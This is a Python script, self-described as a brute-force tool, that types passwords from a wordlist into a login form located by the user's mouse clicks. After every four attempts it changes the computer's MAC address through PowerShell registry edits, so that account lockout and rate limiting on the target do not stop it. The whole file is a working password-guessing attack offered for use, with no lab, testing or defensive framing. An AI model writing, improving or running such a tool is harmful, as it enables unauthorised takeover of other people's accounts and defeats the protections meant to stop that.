from pynput import mouse
import pyautogui
import time
import random
import os
import subprocess
import sys

def ping_with_conditions(max_successes=3, max_failures=120):
    consecutive_successes = 0
    consecutive_failures = 0
    print(f"Pinging google.com. Stops after {max_successes} successes or {max_failures} failures. Press Ctrl+C to stop.")
    try:
        while True:
            response = subprocess.run(
                ["ping", "-n", "1", "google.com"] if subprocess.os.name == "nt" else ["ping", "-c", "1", "google.com"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            if response.returncode == 0:
                print("Ping successful.")
                consecutive_successes += 1
                consecutive_failures = 0
            else:
                print("Ping failed.")
                consecutive_failures += 1
                consecutive_successes = 0

            if consecutive_successes >= max_successes:
                print(f"Ping successful {max_successes} times consecutively. Stopping.")
                break

            if consecutive_failures >= max_failures:
                print(f"Ping failed {max_failures} times consecutively. Stopping.")
                break

            time.sleep(1)
    except KeyboardInterrupt:
        print("\nPing stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

def change_mac_address(adapter):
    first_byte = random.randint(0x00, 0xFF) & 0xFE | 0x02
    mac_bytes = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    mac_address = "".join(f"{byte:02x}" for byte in mac_bytes)
    
    try:
        commands = [
            ["powershell", "-Command", f"Disable-NetAdapter -Name '{adapter}' -Confirm:$false"],
            [
                "powershell", 
                "-Command", 
                f"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001' -Name NetworkAddress -Value {mac_address}"
            ],
            ["powershell", "-Command", f"Enable-NetAdapter -Name '{adapter}'"],
        ]

        for cmd in commands:
            print(f"Executing: {cmd}")
            subprocess.run(cmd, check=True)
        ping_with_conditions()
    
        print(f"MAC address changed successfully. New MacAddress: {mac_address}")
    except subprocess.CalledProcessError as e:
        print(f"Error changing MAC address: {e}")
        sys.exit(1)
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        sys.exit(1)

def wait_for_click(field_name):
    print(f"Click on the {field_name} input field...")
    
    x, y = None, None
    def on_click(x_position, y_position, button, pressed):
        nonlocal x, y 
        if pressed: 
            x, y = x_position, y_position
            print(f"Captured click at coordinates: {x}, {y} for {field_name}")
            return False

    with mouse.Listener(on_click=on_click) as listener:
        listener.join()
    return x, y

def enter_credentials(adapter, wordlist, username, username_coords, password_coords):
    print("Starting brute force...")
    try:
        with open(wordlist, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
        sys.exit(1)
    attempts = 0 

    for password in passwords:
        password = password.strip()

        try:
            pyautogui.click(username_coords)
            pyautogui.typewrite(username, interval=0.1)
        except Exception as e:
            print(f"Error entering password '{password}': {e}")
            sys.exit(1)

        try:
            pyautogui.click(password_coords)
            pyautogui.typewrite(password, interval=0.1)
        except Exception as e:
            print(f"Error entering password '{password}': {e}")
            sys.exit(1)

        try:
            pyautogui.press("enter")
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press("backspace")
            print(f"Tried password: {password}")
        except Exception as e:
            print(f"Error pressing Enter after password '{password}': {e}")
            sys.exit(1)
        time.sleep(1)
        attempts += 1

        if attempts >= 4:
            print("Changing MAC address after 4 attempts...")
            change_mac_address(adapter)
            attempts = 0

if __name__ == "__main__":
    print("Brute-force tool initialized.")
    get_adapters = ["powershell", "-Command", "Get-NetAdapter"]
    subprocess.run(get_adapters, check=True)
    print("Enter the name of your network adapter for which you want to change MacAddress, For Example [Wi-fi](CASE SENSATIVE):")
    adapter = input()
    print(r"Enter Full path of your password wordlists, For Example [C:\Users\Dell\Documents\wordlist.txt] or Enter 0 for default wordlist [default.txt]: ")
    path = input()
    print("Enter Username: ")
    username = input()

    if path == "0":
        path = "default.txt"
    elif not os.path.exists(path):
        print(f"Wordlist file not found: {path}")
        sys.exit(1)
    time.sleep(3)

    try:
        change_mac_address(adapter)
    except Exception as e:
        print(f"Error changing Macaddress: {e}")
        sys.exit(1)

    try:
        username_coords = wait_for_click("username")
        password_coords = wait_for_click("password")
    except Exception as e:
        print(f"Error capturing username or password field coordinates: {e}")
        sys.exit(1)

    try:
        enter_credentials(adapter, path, username, username_coords, password_coords)
    except Exception as e:
        print(f"Error during brute-forcing: {e}")
        sys.exit(1)
